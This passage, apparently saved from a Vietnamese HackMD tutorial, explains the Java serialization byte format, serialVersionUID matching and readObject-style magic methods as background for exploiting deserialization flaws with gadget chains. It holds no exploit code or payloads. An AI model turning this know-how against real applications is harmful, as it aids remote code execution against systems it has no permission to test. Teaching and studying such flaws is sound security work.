text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HynYx488xe.png" alt="kiểu dữ liệu trong serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="17083" data-size="79" loading="lazy" style="width: auto; height: auto;"></span></p><ul class="part" data-startline="250" data-endline="251" data-position="17163" data-size="0">
<li class="" data-startline="250" data-endline="250" data-position="17165" data-size="0"><span data-position="17165" data-size="285">Trong Java Serialization, mỗi thuộc tính (field) của một lớp được lưu trữ kèm theo một mã ký hiệu 1 byte gọi là Field Type Code, dùng để chỉ định kiểu dữ liệu của thuộc tính đó. Điều này giúp cho Java Virtual Machine (JVM) hiểu được cách giải mã dữ liệu từ byte stream khi deserialize.</span></li>
<li class="" data-startline="251" data-endline="251" data-position="17453" data-size="0"><span data-position="17453" data-size="20">Bảng Field Type Code</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="252" data-endline="266" data-infoprefix-length="8" data-position="17474"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Ký hiệu <span class="hljs-operator">|</span> Kiểu dữ liệu Java cơ bản       <span class="hljs-operator">|</span> Ghi chú                      <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">|</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">|</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> B      <span class="hljs-operator">|</span> `<span class="hljs-keyword">byte</span>`                        <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> C      <span class="hljs-operator">|</span> `char`                        <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> D      <span class="hljs-operator">|</span> `double`                      <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span> `float`                       <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> I      <span class="hljs-operator">|</span> `<span class="hljs-keyword">int</span>`                         <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> J      <span class="hljs-operator">|</span> `long`                        <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> S      <span class="hljs-operator">|</span> `short`                       <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> Z      <span class="hljs-operator">|</span> `boolean`                     <span class="hljs-operator">|</span>                             <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> L      <span class="hljs-operator">|</span> Object (tham chiếu lớp)       <span class="hljs-operator">|</span> Theo sau là tên lớp, kết thúc bằng `;` <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> [      <span class="hljs-operator">|</span> Mảng (array)                  <span class="hljs-operator">|</span> Theo sau là kiểu phần tử     <span class="hljs-operator">|</span>

</code></pre>
      </div><p class="part" data-startline="267" data-endline="267" data-position="18382" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="18382" data-size="68" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/BJe9bN88xx.png" alt="Giá trị của thuộc tính" class="offline-handled error-handled image-toolbar-handled" data-position="18382" data-size="68" loading="lazy" style="width: auto; height: auto;"></span></p><ul class="part" data-startline="268" data-endline="269" data-position="18451" data-size="0">
<li class="" data-startline="268" data-endline="268" data-position="18453" data-size="0"><span data-position="18453" data-size="223">Sau khi ghi thông tin về kiểu dữ liệu (Field Type Code) và tên attribute, Java Serialization sẽ tiếp tục lưu giá trị (value) tương ứng của mỗi thuộc tính theo thứ tự đã khai báo trong class (tính cả các thuộc tính kế thừa).</span></li>
<li class="" data-startline="269" data-endline="269" data-position="18680" data-size="0"><span data-position="18680" data-size="129">Với cách ghi giá trị, với kiểu dữ liệu nguyên thủy (primitive). Thì Giá trị được ghi trực tiếp theo đúng kích thước kiểu dữ liệu:</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="270" data-endline="281" data-infoprefix-length="8" data-position="18810"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Kiểu    <span class="hljs-operator">|</span> Kích thước <span class="hljs-operator">|</span> Ghi chú                       <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-keyword">int</span>     <span class="hljs-operator">|</span> <span class="hljs-number">4</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span> Dạng big<span class="hljs-operator">-</span>endian (MSB trước)   <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> long    <span class="hljs-operator">|</span> <span class="hljs-number">8</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span>                               <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> short   <span class="hljs-operator">|</span> <span class="hljs-number">2</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span>                               <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-keyword">byte</span>    <span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span>                               <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> char    <span class="hljs-operator">|</span> <span class="hljs-number">2</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span> Mã Unicode                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> float   <span class="hljs-operator">|</span> <span class="hljs-number">4</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span> IEEE <span class="hljs-number">754</span>                      <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> double  <span class="hljs-operator">|</span> <span class="hljs-number">8</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span> IEEE <span class="hljs-number">754</span>                      <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> boolean <span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-keyword">byte</span>     <span class="hljs-operator">|</span> `<span class="hljs-number">0x00</span>` <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>, `<span class="hljs-number">0x01</span>` <span class="hljs-operator">=</span> <span class="hljs-literal">true</span> <span class="hljs-operator">|</span>
</code></pre>
      </div><ul class="part" data-startline="282" data-endline="282" data-position="19396" data-size="0">
<li class="" data-startline="282" data-endline="282" data-position="19398" data-size="0"><span data-position="19398" data-size="37">Với kiểu đối tượng (object hoặc mảng)</span></li>
</ul><blockquote class="part" data-startline="283" data-endline="286" style="border-left-color: rgb(30, 144, 255);">
<p data-position="19438" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span></p>
<ul data-position="19456" data-size="0">
<li class="" data-startline="284" data-endline="284" data-position="19458" data-size="0"><span data-position="19460" data-size="39">Nếu giá trị là null → ghi TC_NULL (0x70)</span></li>
<li class="" data-startline="285" data-endline="285" data-position="19502" data-size="0"><span data-position="19505" data-size="71">Nếu là object chưa ghi trước đó → ghi mô tả đối tượng và giá trị của nó</span></li>
<li class="" data-startline="286" data-endline="286" data-position="19577" data-size="0"><span data-position="19581" data-size="76">Nếu là object đã xuất hiện trước → ghi TC_REFERENCE kèm theo handle reference</span></li>
</ul>
</blockquote><ul class="part" data-startline="288" data-endline="290" data-position="19656" data-size="0">
<li class="" data-startline="288" data-endline="290" data-position="19658" data-size="0"><span data-position="19658" data-size="25">Với các object tùy chỉnh:</span><br>
<span data-position="19684" data-size="142">Nếu là class do người dùng định nghĩa và có implements Serializable, toàn bộ trạng thái của object sẽ được serialize đệ quy theo thứ tự field.</span></li>
</ul><p class="part" data-startline="291" data-endline="291" data-position="19828" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="19828" data-size="85" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HkVN7NULlg.png" alt="serial version uid trong serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="19828" data-size="85" loading="lazy" style="width: auto; height: auto;"></span></p><ul class="part" data-startline="292" data-endline="294" data-position="19914" data-size="0">
<li class="" data-startline="292" data-endline="292" data-position="19916" data-size="0"><strong data-position="19916" data-size="0"><span data-position="19918" data-size="16">serialVersionUID</span></strong><span data-position="19936" data-size="16"> là một giá trị </span><em data-position="19952" data-size="0"><span data-position="19953" data-size="4">long</span></em><span data-position="19958" data-size="170"> đặc biệt được Java sử dụng trong quá trình deserialization để xác định phiên bản của một lớp Serializable. Mỗi đối tượng được ghi xuống dưới dạng serialized sẽ kèm theo </span><strong data-position="20128" data-size="0"><span data-position="20130" data-size="16">serialVersionUID</span></strong><span data-position="20148" data-size="28"> của class tại thời điểm đó.</span></li>
<li class="" data-startline="293" data-endline="293" data-position="20179" data-size="0"><span data-position="20179" data-size="36">Khi deserialization, JVM sẽ so sánh </span><strong data-position="20215" data-size="0"><span data-position="20217" data-size="16">serialVersionUID</span></strong><span data-position="20235" data-size="127"> trong dữ liệu với UID của class hiện tại. Nếu không khớp → JVM ném lỗi InvalidClassException, ngăn quá trình khôi phục object.</span></li>
<li class="" data-startline="294" data-endline="294" data-position="20365" data-size="0"><span data-position="20365" data-size="41">Vì vậy khi tấn công Java Deserialization:</span></li>
</ul><blockquote class="part" data-startline="295" data-endline="298" style="border-left-color: rgb(30, 144, 255);">
<p data-position="20409" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span></p>
<ul data-position="20427" data-size="0">
<li class="" data-startline="296" data-endline="296" data-position="20429" data-size="0"><span data-position="20431" data-size="79">Attacker phải dùng đúng class đã tồn tại trong classpath của ứng dụng mục tiêu.</span></li>
<li class="" data-startline="297" data-endline="297" data-position="20512" data-size="0"><span data-position="20515" data-size="87">Và class đó phải có serialVersionUID trùng khớp với dữ liệu serialized mà attacker gửi.</span></li>
<li class="" data-startline="298" data-endline="298" data-position="20603" data-size="0"><span data-position="20607" data-size="104">Điều này rất quan trọng khi xây dựng gadget chain, vì chỉ cần sai UID, chuỗi tấn công sẽ bị JVM từ chối.</span></li>
</ul>
</blockquote><p class="part" data-startline="300" data-endline="300" data-position="20709" data-size="0"><span data-position="20710" data-size="138">-&gt; Do đó, việc xác định đúng serialVersionUID là điều kiện bắt buộc để pentester có thể khai thác lỗ hổng Java Deserialization thành công.</span></p><p class="part" data-startline="302" data-endline="302" data-position="20849" data-size="0"><span data-position="20849" data-size="11">Tham khảo: </span><a href="https://paper.seebug.org/792/" target="_blank" rel="noopener"><span data-position="20861" data-size="13">gyyyy@猎户攻防实验室</span></a></p><h4 class="part" data-startline="304" data-endline="304" id="25-Java-magic-method" data-id="25-Java-magic-method"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#25-Java-magic-method" title="25-Java-magic-method" data-size="21" data-position="20913" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="20913" data-size="21">2.5 Java magic method</span></h4><p class="part" data-startline="305" data-endline="306" data-position="20935" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="20935" data-size="58" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/ByrWAELUgg.png" alt="magic method" class="offline-handled error-handled image-toolbar-handled" data-position="20935" data-size="58" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="20994" data-size="304">Trong Java, magic method là những phương thức đặc biệt được JVM hoặc framework tự động gọi trong một số tình huống cụ thể, không cần gọi trực tiếp từ lập trình viên. Khi một đối tượng được serialize/deserialize, JVM sẽ tìm kiếm và gọi các phương thức như readObject() hoặc readResolve() để xử lý dữ liệu.</span></p><blockquote class="part" data-startline="307" data-endline="308" style="border-left-color: rgb(255, 0, 0);">
<p data-position="21301" data-size="0"><span class="color" data-color="#ff0000" data-position="0" data-size="15"></span><span data-position="21316" data-size="7"> ✅ Với </span><strong data-position="21323" data-size="0"><span data-position="21325" data-size="9">developer</span></strong><span data-position="21337" data-size="54">: giúp tùy chỉnh hành vi object khi ghi/đọc từ stream.</span><br>
<span data-position="21391" data-size="6">❗ Với </span><strong data-position="21397" data-size="0"><span data-position="21399" data-size="9">pentester</span></strong><span data-position="21411" data-size="89">: đây là nơi lý tưởng để ẩn payload, thực thi code nguy hiểm hoặc kích hoạt gadget chain.</span></p>
</blockquote><p class="part" data-startline="310" data-endline="310" data-position="21501" data-size="0"><span data-position="21501" data-size="55">Một số magic method tiêu chuẩn trong Java Serialization</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="311" data-endline="319" data-infoprefix-length="8" data-position="21557"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Phương thức      <span class="hljs-operator">|</span> Thời điểm được gọi                                 <span class="hljs-operator">|</span> Vai trò chính                                                        <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> readObject()     <span class="hljs-operator">|</span> Khi object được deserialize từ `ObjectInputStream` <span class="hljs-operator">|</span> Tùy chỉnh cách đọc object, có thể thực thi logic tùy ý               <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> writeObject()    <span class="hljs-operator">|</span> Khi object được serialize vào ObjectOutputStream   <span class="hljs-operator">|</span> Tùy chỉnh cách ghi dữ liệu                                           <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> readResolve()    <span class="hljs-operator">|</span> Sau khi object đã deserialize xong                 <span class="hljs-operator">|</span> Cho phép thay thế object vừa đọc bằng object khác (singleton, proxy) <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> writeReplace()   <span class="hljs-operator">|</span> Trước khi serialize                                <span class="hljs-operator">|</span> Cho phép thay object bằng một object khác khi ghi                    <span class="hljs-operator">|</span>

</code></pre>
